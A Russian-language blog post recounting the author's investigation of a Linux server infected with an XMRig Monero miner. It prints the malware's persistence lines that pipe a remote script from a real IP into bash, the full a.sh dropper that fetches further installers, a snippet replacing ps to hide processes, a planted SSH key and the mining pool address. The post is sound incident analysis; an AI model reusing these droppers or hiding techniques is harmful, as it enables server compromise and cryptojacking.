---
layout: post
title:  "Пример поиска вируса в Linux-системе"
meta_description: "Проведем небольшое расследование и найдем зловред на одном из серверов, попытаемся понять, что он делает, и решим, что делать дальше"
date: 2022-02-15
tags: linux viruses investigation mining
categories: article
author: "soko1"
---

Друзья попросили глянуть их зараженный вирусом сервер. Жаловались на то, что он очень медленно работает и странно себя ведет.

Первым делом я выключил сервер и перевел его в режим восстановления (грубо говоря, загрузился в независимую livecd-систему). 

Смонтировал диск с ОС в **/mnt** и сделал полный бэкап системы, с которой собственно и собирался работать, чтобы в случае проблем можно было откатиться назад.

Далее у меня было в планах отключить интернет у сетевой карты, загрузиться в ОС и вживую покопаться в процессах, поэтому мне надо было обнулить пароль у **root**, т.к я его не знал (потом я этот этап решил упразднить).

Для этого я сделал  `chroot /mnt` — и это было ошибкой! Чрут не хотел работать, и я не сразу понял, в чем дело, поэтому остановил его ctrl+c. Потом ты поймешь, чем он занимался в моменте чрутинга... После ctrl+c я попал все таки внутрь системы. 

Попытался сделать **passwd** для смены пароля и наткнулся на ошибку **passwd: Authentication token manipulation error**. 

Полез в **/etc/shadow**, чтобы посмотреть, что там не так, и увидел вот такое мясо:

```
...
hilde:$6$7n/iy4R6znS2iq0J$QjcECLSqMMiUUeHR4iJmkHLzAwgoNRhCC87HI3df95nZH5569TKwJEN2I/lNanPe0vhsdgfILPXedlWlZn7lz0:18461:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::
```

Потом полез в **/etc/passwd** и увидел в конце две свежие записи:

```c
...
hilde:x:1000:1000::/home/hilde:/bin/bash
lsb:x:1000:1000::/home/lsb:/bin/bash
```

В **/home** появилось два новых юзера (**hilde** и **lsb**), в их каталогах три неприметных скрытых файла:

```console
root@rescue /mnt/home/hilde # ls -la
total 20K
drwxr-xr-x   3 root root 4.0K Feb 13 21:20 .
drwxr-xr-x. 13 root root 4.0K Feb 14 18:40 ..
-rw-r--r--   1 root root   80 Feb 13 21:20 .bashrc
-rw-r--r--   1 root root   80 Feb 13 21:20 .profile
drwxr-xr-x   2 root root 4.0K Feb 13 20:25 .ssh
```

Не поверив, что файлы могут быть со стандартным содержимым — решил проверить и не ошибся:

```console
root@rescue /mnt/home/hilde # cat .bashrc
```
```bash 
{
/bin/cdz -fsSL http://104.192.82.138/s3f1015/a/a.sh | bash
} > /dev/null 2>&1
```

```console
root@rescue /mnt/home/hilde # cat .profile 
```
```bash
{
/bin/cdz -fsSL http://104.192.82.138/s3f1015/a/a.sh | bash
} > /dev/null 2>&1
```

Ага, вот и какой-то шеллкод. Сейчас к нему вернемся, но перед этим посмотрим, что у нас в **.ssh**:

```console
root@rescue /mnt/home/hilde/.ssh # ls
authorized_keys  authorized_keys2

root@rescue /mnt/home/hilde/.ssh # cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver
```

Ага, чей-то публичный ключик для коннекта с сервером.

Вобъем в гугл и убедимся что мы не первые жертвы:



<img src="/uploads/2022-02-15-looking-for-virus-in-linux-system/google.png" />

Потом прогнал поиском рекурсивно по ключевику **104.192.82.138** и обнаружил, что абсолютно у всех юзеров (еще и в кронтабе!) эта гадость прописалась:

<img src="/uploads/2022-02-15-looking-for-virus-in-linux-system/find_ip.png" />

Теперь понимаешь, почему при чруте была такая странная и долгая пауза? Потому что в **/root/.bashrc** тоже была записана загрузка шеллкода.<br> 
Настоятельно рекомендую перед чрутом всегда проверять как минимум **root/.bashrc**, **root/.profile** на наличие стремных записей.

Перейдем наконец к шеллкоду — по этому адресу **http://104.192.82.138/s3f1015/a/a.sh** (лучше не качай, а посмотри код ниже) находится скрипт **a.sh** следующего содержания:

```bash
#!/bin/bash
echo "ok22$(date)" >>/tmp/ok.log
export CURL_CMD="curl"
if [ -f /bin/cd1 ];then
    export CURL_CMD="/bin/cd1" 
elif [ -f /bin/cur ];then
    export CURL_CMD="/bin/cur" 
elif [ -f /bin/TNTcurl ];then
    export CURL_CMD="/bin/TNTcurl" 
elif [ -f /bin/curltnt ];then 
    export CURL_CMD="/bin/curltnt" 
elif [ -f /bin/curl1 ];then
    export CURL_CMD="/bin/curl1" 
elif [ -f /bin/cdt ];then
    export CURL_CMD="/bin/cdt" 
elif [ -f /bin/xcurl ];then
    export CURL_CMD="/bin/xcurl"  
elif [ -x "/bin/cdz" ];then
    export CURL_CMD="/bin/cdz"
fi 
sh_url="http://104.192.82.138/s3f1015"  
export MOHOME=/var/tmp/.crypto/...
if [ -f ${MOHOME}/.ddns.log ];then
    echo "process possible running"
    current=$(date +%s)
    last_modified=$(stat -c "%Y" ${MOHOME}/.ddns.log)
    if [ $(($current-$last_modified)) -gt 6 ];then
        echo "process is not running"
    else 
        ${CURL_CMD} -fsSL -o ${MOHOME}/.ddns.pid ${sh_url}/m/reg0.tar.gz
        exit 0
    fi
fi
if [ "$(id -u)" == "0" ];then
    ${CURL_CMD} -fsSL ${sh_url}/c/ar.sh |bash
else
    ${CURL_CMD} -fsSL ${sh_url}/c/ai.sh |bash
fi

```

Если проанализировать этот файлик и собрать все куски воедино, то получатся ссылки на инсталлеры — вот они:

**http://104.192.82.138/s3f1015/c/ar.sh**<br>
**http://104.192.82.138/s3f1015/c/ai.sh**

Файлики по ссылкам качать не советую (поэтому сделал их не кликабельными), да и ссылки эти рано или поздно умрут вместе с сервером. Опубликую код инсталлеров с убранным в начале **#!/bin/bash**, чтобы ты их случайно не запустил (если их не удалит github, потому что они могут попасть в вирусные базы). 

Вот эти два "кастрированных" файла:<br>
[ar.sh.txt](/uploads/2022-02-15-looking-for-virus-in-linux-system/ar.sh.txt)<br>
[ai.sh.txt](/uploads/2022-02-15-looking-for-virus-in-linux-system/ai.sh.txt)

Первый файлик рассчитан на ситуацию, если захваченная машина с рутовскими правами, второй — если это обычный юзер.

У них, кстати, неплохой код, его очень интересно изучать. Хотя и не без грубых косяков!
Например, можно было бы сделать его присутствие менее паливным. Как минимум, не нужно было его пихать сразу во все места, ну и дату создания файла можно же поменять у ФС для созданных и модифицированных файлов. А так, по сути, они все **find**'ом ищутся через опцию **atime**. Ну чуваки, ну камон)

Зато обрати внимание, как он лихо скрывает своё присутствие в **ps**:

```bash
...
mv /bin/ps /bin/ps.lanigiro 
echo "#!/bin/bash">/bin/ps
echo "ps.lanigiro \$@ | grep -v 'ddns\|httpd'" >>/bin/ps 
touch -d 20160825 /bin/ps
chmod a+x /bin/ps
${CHATTR} +i /bin/ps
```

Если интересно (не забудь [написать](/about/)) — могу разобрать их в следующей статье.

Так, вернемся к зараженной машине и посмотрим, что в **/var/tmp/** (этот путь я нашел в ранее упомянутом файлике **a.sh**):

```console
root@rescue /mnt/var/tmp # ls -la
total 28K
drwxrwxrwt.  5 root root 4.0K Feb 14 21:47 .
drwxr-xr-x. 20 root root 4.0K Feb 14 18:38 ..
drwxr-xr-x   3 root root 4.0K Feb 14 12:30 ...
-rw-r--r--   1 root root    9 Feb 13 20:30 .alsp
drwxr-xr-x   2 root root 4.0K Feb 13 20:25 .copydie
drwxr-xr-x   3 root root 4.0K Feb 13 21:20 .crypto
-rw-rw-r--   1  992  989    9 Feb 14 02:34 .psla
```

Так, видим следы, которые оставил скрипт после себя.

Посмотрим, что в обоих каталогах. Это гениально! Обрати внимание на то, как гармонично вписывается скрытый файл **...**, я даже не сразу понял что происходит с шеллом :)

<img src="/uploads/2022-02-15-looking-for-virus-in-linux-system/dot3lol.png" />

Посмотрим, что у нас там:

```console
root@rescue /mnt/var/tmp/.crypto # ls -la .../
total 6.2M
drwxr-xr-x 2 root root 4.0K Feb 14 12:30 .
drwxr-xr-x 3 root root 4.0K Feb 13 21:20 ..
-rwxr-xr-x 1 1000 1000 6.0M Mar  7  2021 .ddns
-rw-r--r-- 1 root root 195K Feb 14 17:52 .ddns.log
-rw-rw-rw- 1 root root 2.6K Feb 14 14:12 .ddns.pid
-rwxrwxrwx 1 root root 9.7K Dec  6 17:43 httpd
-rw-r--r-- 1 root root    7 Feb 13 21:20 .pid
-rw-rw-rw- 1 root root    2 Feb 13 21:20 .profile
```

Два каких-то бинарника:

```console
root@rescue /mnt/var/tmp/.crypto/... # file httpd .ddns
httpd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), statically linked, no section header
.ddns: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, stripped
```

Если верить названию, то это хттп-сервер и какой-то днс. Но верить не будем, но и запускать пока тоже не рискнем. Глянем логи и файлы конфигурации:

```console
root@rescue /mnt/var/tmp/.crypto/... # cat .profile 
0
root@rescue /mnt/var/tmp/.crypto/... # cat .pid 
761153root@rescue /mnt/var/tmp/.crypto/... # 
```

А вот в файлике **.ddns.pid** у нас никакой не pid процесса, а какой-то конфигурационный файл — по всей видимости, майнер:

```json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
...
```

Пробую гуглить какие-нибудь уникальные строчки и выхожу на файлик [https://github.com/xmrig/xmrig/blob/master/src/config.json](https://github.com/xmrig/xmrig/blob/master/src/config.json). Смотрим описание [https://github.com/xmrig/xmrig](https://github.com/xmrig/xmrig) и видим, что это майнер:

>XMRig is a high performance, open source, cross platform RandomX, KawPow, CryptoNight, AstroBWT and [GhostRider](https://github.com/xmrig/xmrig/tree/master/src/crypto/ghostrider#readme) unified CPU/GPU miner and [RandomX benchmark](https://xmrig.com/benchmark). Official binaries are available for Windows, Linux, macOS and FreeBSD.

Так, поехали дальше, у нас еще одна директория имеется:

```console
root@rescue /mnt/var/tmp/.copydie # ls
 config_background.json  '[kswapd0]'  '[kswapd0].log'  '[kswapd0].pid'  '[kswapd0].sh'
```

В общем, и тут майнер:

```console
root@rescue /mnt/var/tmp/.copydie # head -n5 config_background.json
```
```json
{
    "api": {
        "id": null,
        "worker-id": null
    },
```
```console
root@rescue /mnt/var/tmp/.copydie # head -n10 \[kswapd0\].log
```
```text 
 * ABOUT        XMRig/6.2.3-mo2 gcc/7.3.1
 * LIBS         libuv/1.8.0 
 * HUGE PAGES   supported
 * 1GB PAGES    unavailable
 * CPU          Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz (1) x64 AES
                L2:1.0 MB L3:8.0 MB 4C/8T
 * MEMORY       54.8/62.5 GB (88%)
 * DONATE       1%
 * ASSEMBLY     auto:intel
 * POOL #1      elastic.zzhreceive.top:1414 coin monero
``` 

```console
root@rescue /mnt/var/tmp/.copydie # head -n10 \[kswapd0\].sh
```
```bash 
#!/bin/bash
if ! pidof [kswapd0] >/dev/null; then
  nice /var/tmp/.copydie/[kswapd0] $*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
```

Вообще, чистить машину от этой гадости я смысла никакого не вижу. 

Если рассмотреть инсталлеры, код которых я привел выше (**ar.sh**, **ai.sh**), то станет ясно, что он загадил всю машину своими следами, обнулил правила фаерволла и выставил для ряда файлов атрибуты неизменяемости (chattr). 

Кстати, этот вирус и хорошим делом занимается — чистит компьютер от конкурентов: сносит чужие вирусы с майнерами в кронтабе, удаляет неугодные докер-контейнеры :)

Написать скрипт-антидот, конечно, можно, и может быть даже имело бы смысл этим заняться, но возиться с этим у меня пока нет желания. Проще систему переставить.

### Небольшое заключение

Как-то так. Надеюсь тебе понравилось это мини-расследование.

Кстати, если нуждаешься в чистке сервера от какой нибудь нечисти, то можешь [писать мне](/about/).

Ну и буду рад даже очень скромным [донейтам](/donate) (например, на кофе) и какой-нибудь обратной связи.